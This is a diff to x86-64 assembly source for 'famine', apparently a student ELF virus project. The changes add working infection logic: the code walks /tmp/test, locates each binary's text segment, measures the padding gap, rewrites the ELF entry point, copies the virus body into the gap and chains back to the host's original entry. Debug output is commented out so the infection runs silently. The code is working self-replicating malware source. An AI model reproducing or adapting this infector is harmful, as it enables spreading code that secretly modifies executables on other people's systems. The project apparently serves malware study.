@@ -1,22 +1,39 @@
-[BITS 64]
 
 %include "famine.inc"
 
-
+_starting:
+bits 64
 section .text
-	global main
-	extern printf
+default rel
+global main
+extern printf
+
+	_exit:
+	; === Exit without error ===
+	mov rax, SYS_EXIT
+	mov rdi, 42
+	syscall
 
 main:
+	_start:
 	; === Placing our 'famine' struct on the stack ===
 	mov rbp, rsp
 	push rbp
 	mov rbp, rsp
 	sub rsp, famine_size
+	mov rdi, VIRUS_SIZE
+	mov FAM(famine.payload_size), rdi
+;	write_format payload_sz, FAM(famine.payload_size)
 
 	mov rdi, target_dir
 	call _traverse_dirs
-	jmp _exit
+	mov rax, _start
+	add rax, VIRUS_SIZE
+	sub rax, 0xc
+	mov qword rax, [rax]
+	cmp rax, 0
+	je _exit
+	jmp rax
 
 
 ; ##### LOOP THROUGH TARGET DIRECTORIES #####
@@ -126,48 +143,96 @@ _file:
 	movzx rax, byte [rax]
 	cmp rax, 0x2
 	jne _not_valid_x64
-	write_format string, info_1
+;	write_format string, info_1
 
 	; === Getting the segments offset in file ===
 	mov rax, FAM(famine.map_ptr)
 	add rax, elf64_ehdr.e_phoff
-	write_format phoff, [rax]
+;	write_format phoff, [rax]
 
 	; === Finding the text segment in file ===
 	mov r15, [rax]												; Storing e_phoff in r15
 	mov r14, FAM(famine.map_ptr)
 	add r14, elf64_ehdr.e_phnum
 	movzx r14, word [r14]										; Storing e_phnum in r14
-	write_format phnum, r14
+;	write_format phnum, r14
 
-	dec r14														; 
+	dec r14														; Decrementing by 1 since our counter starts at 0
 	mov rax, FAM(famine.map_ptr)
-	add rax, r15
-	xor r13, r13
-	phnum_loop:
+	add rax, r15												; rax is now at the start of segment headers in file
+	xor r13, r13												; Used to loop through all segment headers
+	_phnum_loop:
 		call _is_text_segment
 		cmp r14, r13
-		je _didnt_find_text_segment
+		je _list_dir											; We iterated through all segment headers and didnt find the text segment. Give up for this file
 		add rax, elf64_phdr_size
 		inc r13
-		jmp phnum_loop
+		jmp _phnum_loop
 	_found_text_segment:
 		add rax, elf64_phdr.p_offset
-		write_format text_seg, [rax]
-		add rax, elf64_phdr_size
-		write_format next_seg, [rax]
-	; CALCULATE THE GAP :)
+		mov rdi, [rax]
+		mov FAM(famine.txt_offset), rdi
+;		write_format text_seg, FAM(famine.txt_offset)
+
+		add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
+		mov rdi, [rax]
+		mov FAM(famine.txt_vaddr), rdi
+
+		add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
+		mov rdi, [rax]
+		mov FAM(famine.txt_filesz), rdi
+;		write_format filesz, FAM(famine.txt_filesz)
+
+		add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
+		mov rdi, [rax]
+		mov FAM(famine.next_offset), rdi
+;		write_format next_seg, FAM(famine.next_offset)
+
+	; === Calculating the space available in padding gap ===
+	mov rsi, FAM(famine.next_offset)
+	mov rdi, FAM(famine.txt_offset)
+	add rdi, FAM(famine.txt_filesz)
+	sub rsi, rdi
+	mov FAM(famine.gap_size), rsi
+;	write_format gap_sz, FAM(famine.gap_size)
+
+	; === Comparing gap size and virus size ===
+	mov rdi, FAM(famine.payload_size)
+	cmp rdi, rsi
+	jg _not_enough_space
+;	write_string enough_sp, 27
+
+	; === Patch ELF entry point ===
+	mov rax, FAM(famine.map_ptr)
+	add rax, elf64_ehdr.e_entry
+	mov rsi, [rax]
+	mov FAM(famine.orig_entry), rsi
+;	write_format entry, FAM(famine.orig_entry)
+	mov rdi, FAM(famine.txt_vaddr)
+	add rdi, FAM(famine.txt_filesz)
+	mov [rax], rdi
+;	write_format entry, [rax]
+	
+	; === Writing virus from injection point ===
+	mov rdi, FAM(famine.map_ptr)
+	add rdi, FAM(famine.txt_offset)
+	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
+	mov rsi, _start												; RSI at start of virus
+	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point [faire un -4 ici et ajouter manuellement entry point ?]
+	repnz movsb
+	lea rsi, FAM(famine.orig_entry)
+	mov rcx, 0x8
+	repnz movsb													; Copy host entry point
 
 
 
-		jmp _list_dir
+	jmp _list_dir
 
 
 
 
 _is_text_segment:
 	mov rsi, rax												; rax has the address of p_type
-;	write_format hex, [rsi]
 	cmp dword [rsi], 0x1										; |
 	jne _return													; |	--> If the segment type isn't PT_LOAD, this isn't the text segment  
 	add rsi, elf64_phdr.p_flags
@@ -178,27 +243,19 @@ _is_text_segment:
 	pop rdi
 	jmp _found_text_segment
 
-_didnt_find_text_segment:
-	jmp _list_dir
 
-
-
-_exit:
-	; === Exit without error ===
-	mov rax, SYS_EXIT
-	mov rdi, 0
-	syscall
 
 _not_valid_x64:
 	; === Stop handling file after error ; silently continue _list_dir loop ===
-	write_format string, file_error
+;	write_format string, file_error
+	jmp _list_dir
+
+_not_enough_space:
+;	write_format string, file_error
 	jmp _list_dir
 
 _return:
 	ret
-
-
-
 
 
 ; ##### UTILITY FUNCTIONS FOR LOOPING THROUGH TARGET DIRECTORIES #####
@@ -208,14 +265,14 @@ _handle_dir:
 	cmp rax, 0x0
 	je n_iter
 	iter:
-		write_format directory_i, r15
+;		write_format directory_i, r15
 		jmp _list_dir
 	n_iter:
-		write_format directory_n, r15
+;		write_format directory_n, r15
 		jmp _list_dir
 
 _handle_file:
-	write_format file, r15
+;	write_format file, r15
 	jmp _file
 
 _iterable_dir:
@@ -244,11 +301,6 @@ _exit_dir_loop:
 	ret
 
 
-
-
-
-
-
 target_dir	db		"/tmp/test",0x0
 curr_dir	db		".",0x0
 fname		db		"./test/sample",0x0
@@ -270,25 +322,11 @@ phoff		db		"[*] phoff is %d",0x0a,0x0
 phnum		db		"[*] phnum is %d",0x0a,0x0
 text_seg	db		"[*] Text segment at offset 0x%016x",0x0a,0x0
 next_seg	db		"[*] Next segment at offset 0x%016x",0x0a,0x0
-
-
-
-
-
-
-
-
-
-
-
-; === SOME USEFUL STUFF ===
-
-; -> Printing each byte as char from a memory location
-;	mov rax, FAM(famine.map_ptr)
-;	write_format char, [rax]
-;	inc rax
-;	write_format char, [rax]
-;	inc rax
-;	write_format char, [rax]
-;	inc rax
-;	write_format char, [rax]
+filesz		db		"[*] p_filesz of segment is %d",0x0a,0x0
+gap_sz		db		"[*] Gap size is %d bytes",0x0a,0x0
+payload_sz	db		"[*] Payload size is %d bytes",0x0a,0x0
+enough_sp	db		"[*] Enough space to inject",0x0a,0x0
+entry		db		"[*] Entry point of elf is %p",0x0a,0x0
+h_e			db		"[!] Host entry point is %d",0x0a,0x0
+_finish:
+host_entry	dq		0
